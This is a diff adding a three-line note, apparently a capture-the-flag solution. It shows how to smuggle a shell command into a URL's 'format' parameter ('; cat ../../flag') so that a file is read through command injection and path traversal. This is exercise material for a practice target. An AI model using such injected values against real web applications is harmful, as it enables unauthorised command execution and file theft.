@@ -1,0 +1,3 @@
+Insert ';cat ../../flag' in the url parameter format to get the flag
+
+Ex : http://<yourmachineip>/?format=';cat ../../flag'
